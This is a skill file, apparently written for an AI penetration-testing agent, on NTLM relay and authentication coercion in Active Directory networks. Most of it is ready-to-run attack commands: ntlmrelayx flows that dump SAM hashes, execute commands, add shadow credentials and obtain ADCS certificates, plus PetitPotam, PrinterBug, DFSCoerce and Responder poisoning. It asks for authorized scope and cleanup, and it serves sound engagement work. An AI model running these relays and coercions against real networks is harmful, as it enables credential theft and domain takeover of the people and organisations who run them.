---
name: relay_and_coercion
description: NTLM relay and authentication coercion for internal engagements — responder poisoning to relay (not crack), ntlmrelayx flows (SMB/LDAP/ADCS), coercion primitives (PetitPotam/PrinterBug/DFSCoerce), signing and EPA pre-checks, and which access mode (direct/socks5/gsocket) can run them.
---

# NTLM Relay & Authentication Coercion

Relay beats cracking: instead of breaking a captured NTLM hash offline, you
forward a live authentication to a service that accepts it. The two halves are
**coercion** (making a host authenticate to your listener) and **relay**
(forwarding that authentication to a target). Hash capture-and-crack via
Responder is covered in `internal/lateral_movement`; this skill is the relay
path.

## Where the tooling must run (access-mode rules)

Coercion and poisoning need the *target segment* to reach your listener, and
poisoning additionally needs L2 broadcast position. Match the run's declared
access type:

| Declared access | Poisoning (LLMNR/NBT-NS) | Coercion + relay |
|---|---|---|
| Direct (container on the network) | Viable from the container | Viable from the container |
| SOCKS5 tunnel | Not viable — no L2 presence through the tunnel | Only from a controlled host on the segment (run tools inside a shell on that host), not through the tunnel — coerced hosts cannot call back into the tunnel |
| GSocket shell | Viable from the gsocket host's shell | Viable from the gsocket host — it is already L2-adjacent |

Never try to receive coerced authentication through the SOCKS5 tunnel; the
coerced host has no route to the container. Pivot first (a shell on any
segment host), then run Responder/ntlmrelayx from there.

## Pre-checks (run before any relay)

```bash
# Which SMB hosts do NOT require signing? (relay targets)
nxc smb 10.0.0.0/24 --gen-relay-list /workspace/output/relay_targets.txt

# Per-host signing state
nmap --script smb2-security-mode -p 445 10.0.0.10

# LDAP signing / channel binding on DCs (weak LDAP is a relay target)
nxc ldap 10.0.0.1 -u user -p pass --signed

# Print Spooler enabled? (PrinterBug coercion + PrintNightmare surface)
nxc smb 10.0.0.1 -u user -p pass --spider SP
```

If every host enforces SMB signing, relay to SMB is dead — pivot to LDAP,
ADCS web enrollment (ESC8) or HTTP targets instead.

## Relay flows (ntlmrelayx)

```bash
# Relay to SMB targets without signing — dump SAM
impacket-ntlmrelayx -tf /workspace/output/relay_targets.txt -smb2support

# Relay and execute a command (proof only — keep it non-destructive)
impacket-ntlmrelayx -tf /workspace/output/relay_targets.txt -smb2support \
  -c "whoami > C:\\Windows\\Temp\\relay_proof.txt"

# Relay to LDAPS — shadow credentials / delegation abuse on the coerced object
impacket-ntlmrelayx -t ldaps://dc01.corp.local --delegate \
  --shadow-credentials --shadow-target ws01$

# Relay to ADCS web enrollment (ESC8) — obtain a client-auth cert as the
# coerced machine account, then authenticate with it (see ESC notes in
# technologies/active_directory)
impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
```

## Coercion primitives

Coerce a host into authenticating to your listener IP:

```bash
# PetitPotam (MS-EFSR) — historically unauthenticated; patched but frequently
# still reachable over other pipes. Verify patch state first.
python3 PetitPotam.py <LISTENER_IP> <TARGET_IP>
python3 PetitPotam.py -u user -p pass -d corp.local <LISTENER_IP> <TARGET_IP>

# PrinterBug (MS-RPRN) — needs any domain credentials, Print Spooler running
python3 printerbug.py corp.local/user:pass@<TARGET_IP> <LISTENER_IP>

# DFSCoerce (MS-DFSNM) — needs credentials
python3 dfscoerce.py -u user -p pass -d corp.local <LISTENER_IP> <TARGET_IP>
```

## Combining with Responder

Disable SMB/HTTP capture in Responder so authentication falls through to the
relay instead of being answered locally:

```bash
# Analyze first (passive), then poison with SMB/HTTP off
sudo responder -I <iface> -A
sudo responder -I <iface> -dwFv --disable-smb --disable-http
```

## Evidence and discipline

- Relay proof (command output, dumped SAM entries, obtained certificate)
belongs under `/workspace/output/`; record credentials via `create_finding`
(`finding_type="credential"`), one per secret.
- Listeners and coerced flows are transient, but anything that persists
(certificate enrollment, shadow-credential key credential object,
delegation ACL change) is an engagement artifact: record it with
`record_internal_event` (`artifact_created` / `resource_retained`) and plan
its removal — ADCS certificates and key-credential objects must be cleaned
from the CA/objects, not just from your workspace.
- Relay targets must stay inside the authorized scope: relay only to
in-scope hosts; a coerced machine authenticating to you is not authorization
to pivot to arbitrary addresses.
- OPSEC: poisoning races legitimate name resolution and creates duplicate
answer events; coerced authentication shows as type-3 logons from the target
to your listener. Prefer the narrowest window that produces the evidence,
then stop the listeners.
